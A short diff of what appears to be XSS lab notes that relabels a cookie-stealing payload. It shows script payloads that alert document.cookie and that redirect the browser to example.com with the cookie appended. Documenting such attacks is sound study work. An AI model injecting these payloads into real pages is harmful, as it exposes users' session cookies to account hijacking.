@@ -27,7 +27,7 @@ Cookie can be extracted via: `<script>alert(document.cookie)</script>`
 
 ![](screenshots/cookie_xss_20250327063902.png)
 
-or `<script>location='http://example.com/?c='+document.cookie;</script>`
+or redirect user + steal cookie: `<script>location='http://example.com/?c='+document.cookie;</script>`
 
 ![](screenshots/StealCookieRedirect_20250327_100127.png)
 
